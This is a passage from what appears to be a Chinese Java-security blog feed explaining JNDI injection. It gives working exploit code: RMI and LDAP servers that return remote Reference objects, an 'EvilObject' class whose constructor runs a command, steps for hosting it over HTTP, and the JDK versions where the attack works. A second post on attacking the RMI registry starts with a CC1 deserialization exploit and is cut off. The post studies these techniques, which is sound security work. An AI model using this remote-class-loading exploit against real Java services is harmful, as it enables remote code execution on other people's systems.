class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello, &quot;</span> + name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObjImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, remoteObjImpl);</span><br><span class="line">        System.out.println(<span class="string">&quot;运行中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JndiRmiServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RMI原生的漏洞"><a href="#RMI原生的漏洞" class="headerlink" title="RMI原生的漏洞"></a>RMI原生的漏洞</h4><p>首先跟一下调试, 证明JNDI的rmi服务实际上还是调用了原生的RMI</p><p>我们在客户端的这里打断点, 一直跟lookup方法(详细见参考链接)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240712230751811.png" alt="image-20240712230751811"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240712230544299.png" alt="image-20240712230544299"></p><p>可以看见最后还是执行了我们熟悉的RegistryImpl_Stub类的lookup方法</p><p>因此rmi存在的漏洞这里也是适用的</p><h4 id="引用的漏洞，Normal-Jndi"><a href="#引用的漏洞，Normal-Jndi" class="headerlink" title="引用的漏洞，Normal Jndi"></a>引用的漏洞，Normal Jndi</h4><ul><li>这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。</li></ul><p>这个漏洞与服务端调用了一个 <code>Reference</code> 对象有关</p><p>它类似于一个代理, 从外部url加载一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br></pre></td></tr></table></figure><p>我们先来看对应Reference的构造函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713153750900.png" alt="image-20240713153750900"></p><p>后两个参数 factory, factoryLocation, 不禁让人联想到工厂模式这一设计理念, factoryLocation就是对象工厂的位置(我们的是http), factory为对象工厂名, 前面的className就是要实例化的类既然要实例化, 那它的构造函数就会被调用, 因此可以构造一个恶意类, 其构造函数中存放恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JndiCalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac将其编译为字节码(建议使用命令行来进行, 避免此字节码具有包结构, 注意使用和客户端服务端相同的java版本)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac JndiCalc.java</span><br></pre></td></tr></table></figure><p>然后使用python起一个http服务将其开放即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 7777</span><br></pre></td></tr></table></figure><p>之后运行客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713154736808.png" alt="image-20240713154736808"></p><p>可以跟一下调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713160109911.png" alt="image-20240713160109911"></p><p>到这里实例化了恶意对象</p><p>此方法加载了外部的java字节码, 在高版本中这是不受信任的</p><h3 id="JNDI结合LDAP"><a href="#JNDI结合LDAP" class="headerlink" title="JNDI结合LDAP"></a>JNDI结合LDAP</h3><p>有关LDAP的概念和原理:</p><p><a href="https://www.cnblogs.com/wilburxu/p/9174353.html">https://www.cnblogs.com/wilburxu/p/9174353.html</a></p><blockquote><ul><li>ldap 是一种协议，并不是 Java 独有的。</li></ul><p>LDAP 既是一类服务，也是一种协议，定义在 <a href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>(<a href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p><p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p><p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p></blockquote><p>首先是添加LDAP的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#EvilObject&quot;</span>;  </span><br><span class="line"> <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line"> config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line"> InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line"> port,  </span><br><span class="line"> ServerSocketFactory.getDefault(),  </span><br><span class="line"> SocketFactory.getDefault(),  </span><br><span class="line"> (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line"> config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line"> <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line"> System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line"> ds.startListening();  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line"> <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line"> &#125;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment"> * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment"> */</span> <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line"> <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line"> <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line"> &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line"> &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line"> System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line"> <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line"> <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line"> &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line"> e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line"> result.sendSearchEntry(e);  </span><br><span class="line"> result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.Client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapClient</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;ldap://localhost:1234/EvilObject&quot;</span>);</span><br><span class="line">            System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python 起一个 HTTP 服务在8000端口存放恶意类即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.Client.RemoteObj;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello, world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p>因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。</p></blockquote><p>这里LDAP我还不是很了解, 之后学习了再新开一篇细说</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JNDI注入初探&quot;&gt;&lt;a href=&quot;#JNDI注入初探&quot; class=&quot;headerlink&quot; title=&quot;JNDI注入初探&quot;&gt;&lt;/a&gt;JNDI注入初探&lt;/h1&gt;&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>针对RMI的几种攻击方式</title>
    <link href="http://example.com/2024/07/10/%E9%92%88%E5%AF%B9RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://example.com/2024/07/10/%E9%92%88%E5%AF%B9RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2024-07-10T05:51:40.000Z</published>
    <updated>2024-07-12T07:00:30.425Z</updated>
    
    <content type="html"><![CDATA[<h2 id="客户端攻击注册中心"><a href="#客户端攻击注册中心" class="headerlink" title="客户端攻击注册中心"></a>客户端攻击注册中心</h2><p>客户端请求注册中心有 list, bind, rebind, unbind, lookup这几种方式, 当他们被调用时, 在Registry服务端中<code>RegistryImpl_Skel#dispatch</code>就会对应执行,且往往伴随着反序列化的进行,  这就导致了其易受攻击</p><p>如果你打开查看源码, 会发现dispatch方法下有几个case分支, 他们与调用方法的对应关系如下:</p><ul><li>0 —– bind</li><li>1 —– list</li><li>2 —– lookup</li><li>3 —– rebind</li><li>4 —– unbind</li></ul><p>我们按顺序依次分析:</p><h3 id="bind与rebind"><a href="#bind与rebind" class="headerlink" title="bind与rebind"></a>bind与rebind</h3><p>bind方法对应了你在客户端的这条代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><p>你是否疑惑, 绑定对象不是在服务器实现的吗, 怎么会造成客户端攻击服务器呢??</p><p>实际上在客户端拿到的注册中心的Stub (客户端拿到的是RegistryImpl_Stub) 中,是有上面提到的所有5种方法的, 因此在Client端也可以使用bind方法, 就是这么简单</p><p>直接看<code>RegistryImpl_Skel#dispatch</code>的源码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710140531336.png" alt="image-20240710140531336"></p><p>很容易就发现了反序列化的入口, 这里的var11就是传过来的序列化对象, 因此利用起来也是非常ez     (神马??你问我怎么知道var11是传过来的序列化对象???? 当然是因为它的类型是<code>ObjectInput var11;</code>加上<code>var11 = var2.getInputStream();</code>啦)</p><p>有了反序列化的入口, 配合我们之前学过的CC链, 就可以来一段组合技</p><p>先给注册中心导入CC1的依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接拿来CC1的exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, 